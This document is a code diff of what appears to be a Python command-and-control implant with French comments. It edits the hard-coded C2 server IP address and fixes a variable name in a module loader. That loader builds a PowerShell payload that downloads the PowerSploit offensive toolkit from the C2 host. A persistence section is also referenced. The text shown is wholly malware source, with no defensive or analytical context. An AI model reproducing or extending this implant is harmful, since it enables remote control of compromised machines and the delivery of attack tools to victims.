@@ -35,8 +35,7 @@ receive = ''
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Adresse IP du serveur C2 (Command & Control)
-myip = "10.20.10.104"
-#myip = "172.24.245.136"
+myip = "0.0.0.0"
 
 # ============================================
 # CHEMINS ET PERSISTENCE
@@ -435,7 +434,7 @@ def Load_Module(module_name):
     elif module_name == "powersploit":
         global powersploittodelete, powersplittoexecute
         powersploittodelete = current_path + "\\PowerSploit"
-        powersplittoexecute = current_path + "\\PowerSploit\\PowerSploit.psm1"
+        powersploittoexecute = current_path + "\\PowerSploit\\PowerSploit.psm1"
         payload = f"""
         $url = "http://{myip}/download/PowerSploit.zip"
         $destination = "$(get-location)/PowerSploit.zip"
